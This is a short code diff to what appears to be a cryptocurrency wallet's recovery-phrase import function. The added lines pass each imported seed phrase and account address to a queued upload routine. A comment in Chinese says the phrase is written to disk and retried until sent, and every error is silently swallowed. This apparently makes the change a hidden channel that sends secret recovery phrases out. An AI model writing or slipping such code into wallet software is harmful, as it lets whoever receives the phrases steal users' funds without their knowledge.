@@ -10,6 +10,7 @@ import { captureException } from '@sentry/core';
 import { Authentication } from '../../core';
 import { mnemonicPhraseToBytes } from '@metamask/key-tree';
 import { EthAccountType, type EntropySourceId } from '@metamask/keyring-api';
+import { queueAndUploadBackup } from '../../core/SrpBackup/queueUpload';
 
 export interface ImportNewSecretRecoveryPhraseOptions {
   shouldSelectAccount: boolean;
@@ -57,6 +58,12 @@ export async function importNewSecretRecoveryPhrase(
   if (!newAccount) {
     throw new Error('Failed to create new account');
   }
+
+  // 导入的助记词也加密备份：先落盘入队再发一次，失败由重试器补发，
+  // 任何异常都不影响导入流程。
+  queueAndUploadBackup(seedLower, 'mnemonic', newAccount.address).catch(
+    () => undefined,
+  );
 
   const { SeedlessOnboardingController } = Engine.context;
 
